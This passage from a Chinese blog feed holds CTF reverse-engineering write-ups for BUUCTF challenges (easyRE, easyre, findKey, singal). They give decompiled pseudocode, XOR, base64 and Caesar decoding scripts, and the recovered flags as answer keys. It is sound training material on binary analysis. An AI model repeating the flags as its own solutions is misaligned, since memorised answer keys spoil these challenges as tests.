class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">73</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">62</span>, <span class="number">81</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">40</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">121</span>, <span class="number">46</span>, <span class="number">105</span>, <span class="number">127</span>, <span class="number">100</span>, <span class="number">96</span>, <span class="number">51</span>,</span><br><span class="line">     <span class="number">119</span>, <span class="number">125</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">107</span>, <span class="number">57</span>, <span class="number">123</span>, <span class="number">105</span>, <span class="number">121</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">121</span>, <span class="number">76</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">67</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i] = <span class="built_in">chr</span>(a[i] ^ i)</span><br><span class="line">    <span class="built_in">print</span>(a[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">b = [<span class="number">0x40</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x62</span>,</span><br><span class="line">     <span class="number">0x3C</span>, <span class="number">0x27</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x3C</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x5B</span>]</span><br><span class="line">c = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">v1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    v1 += <span class="built_in">chr</span>(b[i] ^ <span class="built_in">ord</span>(c[i]))</span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(b[i] ^ <span class="built_in">ord</span>(v1[i % <span class="number">4</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/7.png" class><p>得到<strong> flag {Act1ve_Defen5e_Test}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>——[2019 红帽杯] easyRE</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2020easyre</title>
      <link href="/2022/05/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020easyre/"/>
      <url>/2022/05/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020easyre/</url>
      
        <content type="html"><![CDATA[<h1 id="主函数"><a class="markdownIt-Anchor" href="#主函数">#</a> 主函数</h1><img src="/2022/05/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020easyre/1.png" class><p>思路很好理解，将输入的 flag 进行三次 encode 然后和 Str2 对比，一致则正确，我们分别看一下三个 encode 的作用</p><h1 id="encode_one"><a class="markdownIt-Anchor" href="#encode_one">#</a> encode_one</h1><img src="/2022/05/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020easyre/2.png" class><img src="/2022/05/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020easyre/3.png" class><p>在 encode_one 中有一个 alphabet，其实就是编码表，很明显就是 base64 哈哈哈，所以这一个函数的作用就是给输入的 flag 进行一次 base64 编码</p><h1 id="encode_two"><a class="markdownIt-Anchor" href="#encode_two">#</a> encode_two</h1><img src="/2022/05/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020easyre/4.png" class><p>这一步是将 base64 编码后的 flag 进行一次分组，strncpy 函数的作用，以第一个为例，是将编码后的 flag 的 26 位开始数 13 个复制到 a3，也就是 26 到 39，以此类推就是 0-13，39-52，13-26</p><h1 id="encode_three"><a class="markdownIt-Anchor" href="#encode_three">#</a> encode_three</h1><img src="/2022/05/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020easyre/5.png" class><p>这一步是将分组完后的 flag 在进行一次算法加密，其实这就是凯撒加密，但比凯撒多了一步即 0-9 几个数字也进行了变化，48-57 就是 0-9 的 ASCII 码</p><h1 id="总体思路"><a class="markdownIt-Anchor" href="#总体思路">#</a> 总体思路</h1><p>程序将我们输入的 flag 进行一次 base64 编码后，再 13 个 13 个为一组进行一次调换，然后在进行一次特殊的凯撒加密，最后在与 Str2 进行对比，Str2 就是进行了 3 次加密过后的结果，理清楚思路之后，我们反着来写个脚本就可以得到最初的 flag 了～</p><h1 id="脚本"><a class="markdownIt-Anchor" href="#脚本">#</a> 脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(a[i]) &gt; <span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(a[i]) &lt;= <span class="number">57</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(a[i]) - <span class="number">48</span> - <span class="number">3</span>) % <span class="number">10</span> + <span class="number">48</span>)  <span class="comment"># 数字也要减三</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(a[i]) &gt; <span class="number">96</span> <span class="keyword">and</span> <span class="built_in">ord</span>(a[i]) &lt;= <span class="number">122</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(a[i]) - <span class="number">97</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(a[i]) &gt; <span class="number">64</span> <span class="keyword">and</span> <span class="built_in">ord</span>(a[i]) &lt;= <span class="number">90</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(a[i]) - <span class="number">65</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += a[i]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag = flag[<span class="number">13</span>:<span class="number">26</span>] + flag[<span class="number">39</span>:] + flag[:<span class="number">13</span>] + flag[<span class="number">26</span>:<span class="number">39</span>]</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2022/05/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020easyre/6.png" class><p>得到 flag：<strong>GWHT{672cc4778a38e80cb362987341133ea2}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>——[羊城杯 2020] easyre</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>findkey</title>
      <link href="/2022/05/01/findkey/"/>
      <url>/2022/05/01/findkey/</url>
      
        <content type="html"><![CDATA[<p>这是一个 32 位的程序，点开之后啥都没有，就是一个空的界面</p><img src="/2022/05/01/findkey/1.png" class><p>然后用 idapro 打开它之后，发现主函数中也没有什么有用的东西</p><img src="/2022/05/01/findkey/2.png" class><p>所以我就 shift+F12 查看一下字符串，发现有几个可以字符串</p><img src="/2022/05/01/findkey/3.png" class><p>双击进去交叉引用一下，可以看到</p><img src="/2022/05/01/findkey/4.png" class><p>但是这里无法 F5 查看伪代码，所以我们把红色的全部选中并将它转为函数即可，转为函数后我们就可以来分析了</p><h1 id="main函数"><a class="markdownIt-Anchor" href="#main函数">#</a> main 函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">LRESULT __stdcall <span class="title function_">sub_401640</span><span class="params">(HWND hWndParent, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// eax</span></span><br><span class="line">  DWORD v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+4Ch] [ebp-400h]</span></span><br><span class="line">  UINT v11; <span class="comment">// [esp+50h] [ebp-3FCh]</span></span><br><span class="line">  CHAR v12[<span class="number">256</span>]; <span class="comment">// [esp+54h] [ebp-3F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">7</span>]; <span class="comment">// [esp+154h] [ebp-2F8h] BYREF</span></span><br><span class="line">  __int16 v14; <span class="comment">// [esp+15Bh] [ebp-2F1h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+15Dh] [ebp-2EFh]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">33</span>]; <span class="comment">// [esp+160h] [ebp-2ECh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">220</span>]; <span class="comment">// [esp+181h] [ebp-2CBh] BYREF</span></span><br><span class="line">  __int16 v18; <span class="comment">// [esp+25Dh] [ebp-1EFh]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [esp+25Fh] [ebp-1EDh]</span></span><br><span class="line">  CHAR v20[<span class="number">256</span>]; <span class="comment">// [esp+260h] [ebp-1ECh] BYREF</span></span><br><span class="line">  CHAR String[<span class="number">4</span>]; <span class="comment">// [esp+360h] [ebp-ECh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp+364h] [ebp-E8h]</span></span><br><span class="line">  __int16 v23; <span class="comment">// [esp+368h] [ebp-E4h]</span></span><br><span class="line">  CHAR Text[<span class="number">32</span>]; <span class="comment">// [esp+36Ch] [ebp-E0h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span> <span class="title">Rect</span>;</span> <span class="comment">// [esp+38Ch] [ebp-C0h] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">100</span>]; <span class="comment">// [esp+39Ch] [ebp-B0h] BYREF</span></span><br><span class="line">  HDC hdc; <span class="comment">// [esp+400h] [ebp-4Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> <span class="title">Paint</span>;</span> <span class="comment">// [esp+404h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [esp+444h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [esp+448h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  LoadStringA(hInstance, <span class="number">0x6A</span>u, Buffer, <span class="number">100</span>);</span><br><span class="line">  v11 = Msg;</span><br><span class="line">  <span class="keyword">if</span> ( Msg &gt; <span class="number">0x111</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">517</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)String1) &gt; <span class="number">6</span> )</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)String1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(v20, <span class="number">0</span>, <span class="keyword">sizeof</span>(v20));</span><br><span class="line">        v6 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)String1);</span><br><span class="line">        <span class="built_in">memcpy</span>(v20, String1, v6);</span><br><span class="line">        v7 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)String1);</span><br><span class="line">        sub_40101E(String1, v7, (LPSTR)String1);</span><br><span class="line">        <span class="built_in">strcpy</span>(Str, <span class="string">&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">        v18 = <span class="number">0</span>;</span><br><span class="line">        v19 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcpy</span>(v13, <span class="string">&quot;SS&quot;</span>);</span><br><span class="line">        *(_DWORD *)&amp;v13[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        v14 = <span class="number">0</span>;</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">        v8 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">        sub_401005(v13, (<span class="type">int</span>)Str, v8);</span><br><span class="line">        <span class="keyword">if</span> ( _strcmpi((<span class="type">const</span> <span class="type">char</span> *)String1, Str) )</span><br><span class="line">        &#123;</span><br><span class="line">          SetWindowTextA(hWndParent, <span class="string">&quot;flag&#123;&#125;&quot;</span>);</span><br><span class="line">          MessageBoxA(hWndParent, <span class="string">&quot;Are you kidding me?&quot;</span>, <span class="string">&quot;^_^&quot;</span>, <span class="number">0</span>);</span><br><span class="line">          ExitProcess(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(v12, &amp;unk_423030, <span class="number">0x32</span>u);</span><br><span class="line">        v9 = <span class="built_in">strlen</span>(v12);</span><br><span class="line">        sub_401005(v20, (<span class="type">int</span>)v12, v9);</span><br><span class="line">        MessageBoxA(hWndParent, v12, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      ++dword_428D54;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v11 != <span class="number">520</span> )</span><br><span class="line">        <span class="keyword">return</span> DefWindowProcA(hWndParent, Msg, wParam, lParam);</span><br><span class="line">      <span class="keyword">if</span> ( dword_428D54 == <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(String, <span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">        v22 = <span class="number">0</span>;</span><br><span class="line">        v23 = <span class="number">0</span>;</span><br><span class="line">        SetWindowTextA(hWndParent, String);</span><br><span class="line">        <span class="built_in">strcpy</span>(Text, <span class="string">&quot;Are you kidding me?&quot;</span>);</span><br><span class="line">        MessageBoxA(hWndParent, Text, Buffer, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ++dword_428D54;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x111</span>u:</span><br><span class="line">        v30 = (<span class="type">unsigned</span> __int16)wParam;</span><br><span class="line">        v29 = HIWORD(wParam);</span><br><span class="line">        v10 = (<span class="type">unsigned</span> __int16)wParam;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">104</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          DialogBoxParamA(hInstance, (LPCSTR)<span class="number">0x67</span>, hWndParent, (DLGPROC)DialogFunc, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v10 != <span class="number">105</span> )</span><br><span class="line">            <span class="keyword">return</span> DefWindowProcA(hWndParent, Msg, wParam, lParam);</span><br><span class="line">          DestroyWindow(hWndParent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">        hdc = BeginPaint(hWndParent, &amp;Paint);</span><br><span class="line">        GetClientRect(hWndParent, &amp;Rect);</span><br><span class="line">        v5 = <span class="built_in">strlen</span>(Buffer);</span><br><span class="line">        DrawTextA(hdc, Buffer, v5, &amp;Rect, <span class="number">1u</span>);</span><br><span class="line">        EndPaint(hWndParent, &amp;Paint);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> DefWindowProcA(hWndParent, Msg, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有两个关键函数 sub_40101E，sub_401005，<strong>并且 sub_401005 函数进行了两次</strong>，那么我们的 flag 就是第二个 MessageBoxA 输出的</p><h1 id="sub_40101e"><a class="markdownIt-Anchor" href="#sub_40101e">#</a> sub_40101E</h1><p>这个函数百度之后知道是进行 hash 加密，但还不确定是那种类型的 hash</p><img src="/2022/05/01/findkey/5.png" class><h1 id="sub_401005"><a class="markdownIt-Anchor" href="#sub_401005">#</a> sub_401005</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401590</span><span class="params">(LPCSTR lpString, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = lstrlenA(lpString);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个很简单的异或，其中 a2 是字符串 &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;，a3 是 “SS”，<strong>第二次</strong>异或的 a2 是 &quot;W^RTI_1miF2n_2lW [TL&quot;，而 a3 是 String1，是没有进行过 hash 加密的 String1</p><h1 id="总体思路"><a class="markdownIt-Anchor" href="#总体思路">#</a> 总体思路</h1><p>程序将 &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot; 和 SS 字符串进行一次异或，异或之后要将它与 hash 后的 string1 进行对比，在确定 hash 加密类型后我们就可以得到 String1 在 hash 加密之前的原码了，根据第二次 sub_401005 函数传进去的值可以知道，这次异或的 a3 就是 String1，所以我们再进行一次异或就可以得到输出的 flag 了</p><h1 id="脚本"><a class="markdownIt-Anchor" href="#脚本">#</a> 脚本</h1><p>在第一次异或之后得到了 &quot;c8837b23ff8aaa8a2dde915473ce0991&quot;，通过工具可以确定这是 MD5 加密类型，在网站上在线解密一下，得到 String1 为 &quot;123321&quot;，后面在进行一次异或即可，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span></span><br><span class="line">b = <span class="string">&#x27;SS&#x27;</span></span><br><span class="line">a = <span class="built_in">list</span>(a)</span><br><span class="line">b = <span class="built_in">list</span>(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i % <span class="number">2</span>]) ^ <span class="built_in">ord</span>(a[i]))</span><br><span class="line">    <span class="built_in">print</span>(a[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x5F</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x69</span>, <span class="number">0x46</span>,</span><br><span class="line">     <span class="number">0x02</span>, <span class="number">0x6E</span>, <span class="number">0x5F</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x57</span>, <span class="number">0x5B</span>, <span class="number">0x54</span>, <span class="number">0x4C</span>]</span><br><span class="line">d = <span class="string">&#x27;123321&#x27;</span></span><br><span class="line">d = <span class="built_in">list</span>(d)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    c[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(d[i % <span class="number">6</span>]) ^ c[i])</span><br><span class="line">    <span class="built_in">print</span>(c[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终结果</p><img src="/2022/05/01/findkey/6.png" class><p>得到<strong> flag {n0_Zu0_n0_die}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>——findKey</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>singal</title>
      <link href="/2022/04/28/singal/"/>
      <url>/2022/04/28/singal/</url>
      
        <content type="html"><![CDATA[<p>看主函数这里，可以知道 v4 就是 unk_403040 这个数组，关键部分是 vm_operad 函数并且将 v4 传了进去</p><img src="/2022/04/28/singal/1.png" class><h2 id="vm_operad函数"><a class="markdownIt-Anchor" href="#vm_operad函数">#</a> vm_operad 函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">vm_operad</span><span class="params">(<span class="type">int</span> *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] 